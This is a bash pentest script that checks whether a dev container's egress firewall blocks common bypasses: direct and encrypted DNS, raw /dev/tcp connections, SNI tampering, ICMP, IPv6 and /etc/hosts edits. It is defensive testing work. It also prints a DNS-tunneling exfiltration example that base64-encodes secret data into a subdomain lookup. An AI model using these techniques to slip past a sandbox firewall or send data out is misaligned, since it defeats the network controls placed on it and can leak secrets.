#!/usr/bin/env bash
# bypass.sh — firewall pentest from inside the container.
# Runs several classic bypass techniques and reports whether they
# pass (❌ BYPASS) or are properly blocked (✔).
#
# Run from the container: `bash /workspace/.devcontainer/firewall/tests/bypass.sh`
# Or via docker exec: `docker exec -it <container> bash .../bypass.sh`

set -u

TIMEOUT=3
PASS=0
FAIL=0

# Blocked target: example.com (also used by init-firewall.sh)
BLOCKED_HOST="example.com"
BLOCKED_IP=""  # filled later
ALLOWED_HOST="api.github.com"
ALLOWED_IP=""

resolve_offline() {
  # Resolution bypassing our local dnsmasq (to get a reference IP
  # to attempt bypasses against).
  dig +short +time=2 +tries=1 @127.0.0.11 "$1" A 2>/dev/null \
    | grep -E '^([0-9]{1,3}\.){3}[0-9]{1,3}$' | head -1
}

test_step() {
  local desc="$1"
  local expected="$2"  # "blocked" or "allowed"
  shift 2
  local result rc

  if "$@" >/dev/null 2>&1; then
    result="passed"
  else
    result="failed"
  fi

  if [ "$expected" = "blocked" ]; then
    if [ "$result" = "failed" ]; then
      echo "  ✔ $desc (correctly blocked)"
      PASS=$((PASS+1))
    else
      echo "  ❌ BYPASS — $desc (request succeeded)"
      FAIL=$((FAIL+1))
    fi
  else
    # Baseline test (allowed)
    if [ "$result" = "passed" ]; then
      echo "  ✔ $desc"
      PASS=$((PASS+1))
    else
      echo "  ⚠️  $desc (expected to pass but failed)"
    fi
  fi
}

echo "═══════════════════════════════════════════════════════"
echo "  Firewall bypass test"
echo "  Container : $(hostname)"
echo "  Date      : $(date)"
echo "═══════════════════════════════════════════════════════"

# Get a blocked IP and an allowed IP as references
echo
echo "→ Resolving targets…"
BLOCKED_IP=$(resolve_offline "$BLOCKED_HOST")
ALLOWED_IP=$(resolve_offline "$ALLOWED_HOST")
echo "  Blocked : $BLOCKED_HOST → ${BLOCKED_IP:-<resolution failed>}"
echo "  Allowed : $ALLOWED_HOST → ${ALLOWED_IP:-<resolution failed>}"

# ─────────────────────────────────────────────────────────
echo
echo "▌ Baseline (sanity checks)"
test_step "curl allowed host via local DNS" allowed \
  curl -s --max-time $TIMEOUT "https://$ALLOWED_HOST/"

test_step "curl blocked host (reference)" blocked \
  curl -s --max-time $TIMEOUT "https://$BLOCKED_HOST/"

# ─────────────────────────────────────────────────────────
echo
echo "▌ DNS-level bypass attempts"

test_step "dig direct to 8.8.8.8 (UDP/53)" blocked \
  dig +short +time=$TIMEOUT @8.8.8.8 "$BLOCKED_HOST" A
# Note: if UDP/53 is open (Phase 1 leaves it for dnsmasq upstream),
# this test can PASS (dig succeeds). Known Phase 1 hole.

test_step "DNS over HTTPS (Cloudflare)" blocked \
  curl -s --max-time $TIMEOUT "https://1.1.1.1/dns-query?name=$BLOCKED_HOST&type=A" \
       -H "accept: application/dns-json"

test_step "DNS over TLS (port 853)" blocked \
  bash -c "echo > /dev/tcp/1.1.1.1/853"

# ─────────────────────────────────────────────────────────
echo
echo "▌ IP-level bypass attempts"

if [ -n "$BLOCKED_IP" ]; then
  test_step "curl direct to blocked IP (TCP/443)" blocked \
    curl -s --max-time $TIMEOUT --insecure "https://$BLOCKED_IP/"

  test_step "TCP raw to blocked IP:443" blocked \
    bash -c "echo > /dev/tcp/$BLOCKED_IP/443"

  test_step "TCP raw to blocked IP:80" blocked \
    bash -c "echo > /dev/tcp/$BLOCKED_IP/80"

  test_step "TCP raw to blocked IP:22 (SSH)" blocked \
    bash -c "echo > /dev/tcp/$BLOCKED_IP/22"
fi

# SSH to a non-allowed host (port 22 must no longer be wide open)
test_step "TCP raw to non-allowed host:22" blocked \
  bash -c "timeout $TIMEOUT bash -c 'echo > /dev/tcp/example.com/22' 2>&1"

# Detect strict mode (mitmproxy active) — determines whether some L4 tests
# should be blocked (strict) or are informational only (basic).
MITM_ACTIVE=false
if pgrep -x mitmdump >/dev/null 2>&1 && \
   iptables -t nat -L OUTPUT -n 2>/dev/null | grep -q "REDIRECT.*8080"; then
  MITM_ACTIVE=true
fi

# ─────────────────────────────────────────────────────────
echo
if $MITM_ACTIVE; then
  echo "▌ L4 attempts — should now be blocked (strict mode)"
  echo "  mitmproxy intercepts TLS and resolves upstream via dnsmasq+ipset."
  echo "  SNI tampering → mitmproxy tries to reach the real SNI → blocked by ipset."
else
  echo "▌ Known L4 limits (basic mode — informational, not real bypasses)"
  echo "  The Phase 1 firewall sees IP:port, not SNI/Host/path."
  echo "  Strict mode (mitmproxy) closes these by inspecting L7."
fi
echo

# SNI tampering — connection to an allowed IP with a forged Host header.
if [ -n "$ALLOWED_IP" ]; then
  if $MITM_ACTIVE; then
    test_step "SNI tampering ($BLOCKED_HOST via IP of $ALLOWED_HOST)" blocked \
      curl -s --max-time $TIMEOUT --insecure \
        --resolve "$BLOCKED_HOST:443:$ALLOWED_IP" \
        "https://$BLOCKED_HOST/"
  else
    if curl -s --max-time $TIMEOUT --insecure \
         --resolve "$BLOCKED_HOST:443:$ALLOWED_IP" \
         "https://$BLOCKED_HOST/" >/dev/null 2>&1; then
      echo "  ⓘ TCP/443 to allowed IP with SNI=$BLOCKED_HOST succeeded"
      echo "    → data sent to \$ALLOWED_IP (server returns 404), no exfil"
    else
      echo "  ✔ Connection rejected even at L4 level (strict TLS)"
    fi
  fi
fi

# Non-standard port on an allowed IP — Phase 1 allows all ports towards
# ipset. In strict mode, mitmproxy only intercepts TCP/443 (cf REDIRECT);
# other ports still go through raw. Informational only.
if [ -n "$ALLOWED_IP" ]; then
  if timeout $TIMEOUT bash -c "echo > /dev/tcp/$ALLOWED_IP/8080" 2>/dev/null; then
    echo "  ⓘ Port 8080 to allowed IP let through by the firewall"
  else
    echo "  ⓘ Port 8080 closed on the remote server ($ALLOWED_HOST does not listen)"
    echo "    The firewall would have let it through; there's just no service"
    echo "    to reach."
  fi
fi

# Verify mitmproxy in the TLS chain (strict only)
if $MITM_ACTIVE && [ -n "$ALLOWED_HOST" ]; then
  if curl -sv --max-time $TIMEOUT "https://$ALLOWED_HOST/" 2>&1 \
       | grep -qi "issuer.*mitmproxy"; then
    echo "  ✔ mitmproxy CA present in the TLS chain of $ALLOWED_HOST"
    PASS=$((PASS+1))
  else
    echo "  ❌ mitmproxy CA absent — TLS interception does not appear active"
    FAIL=$((FAIL+1))
  fi
fi

# ─────────────────────────────────────────────────────────
echo
echo "▌ Network-layer bypass attempts"

test_step "ICMP (ping) to blocked target" blocked \
  ping -c 1 -W $TIMEOUT "$BLOCKED_HOST"

test_step "ICMP (ping) to blocked IP directly" blocked \
  bash -c "[ -n '$BLOCKED_IP' ] && ping -c 1 -W $TIMEOUT $BLOCKED_IP"

# IPv6 — important: the current firewall does NOT cover ip6tables
test_step "IPv6 available" blocked \
  bash -c "ip -6 addr | grep -q 'scope global'"
# If the test passes (= IPv6 available), we have a potential hole because
# ip6tables was not configured. To fix if IPv6 is enabled.

# ─────────────────────────────────────────────────────────
echo
echo "▌ /etc/hosts tampering"

test_step "write to /etc/hosts (user node)" blocked \
  bash -c "echo '1.2.3.4 evil.com' >> /etc/hosts"
# If the `node` user can write to /etc/hosts, they can create an alias
# to an allowed IP (e.g. 140.82.121.6 = github), partial bypass for plain
# HTTP (HTTPS still fails due to SNI mismatch).

# ─────────────────────────────────────────────────────────
echo
echo "▌ DNS tunneling (info only, not a real test)"
echo "  ⓘ DNS exfiltration is possible via subdomain encoding on a domain"
echo "    controlled by the attacker and listed in domains.txt. Example:"
echo "    dig $(echo SECRET_DATA | base64).allowed-domain.com"
echo "    → resolved via 8.8.8.8 → forwarded to allowed-domain.com NS"
echo "    Phase 2+ with mitmproxy can filter but Phase 1 is vulnerable"
echo "    if a listed domain is compromised."

# ─────────────────────────────────────────────────────────
echo
echo "═══════════════════════════════════════════════════════"
echo "  Results: ✔ $PASS  ❌ $FAIL"
if [ $FAIL -gt 0 ]; then
  echo "  ⚠️  $FAIL bypass(es) detected — see ❌ lines above"
  exit 1
fi
echo "  All attempted bypasses are blocked."
echo "═══════════════════════════════════════════════════════"
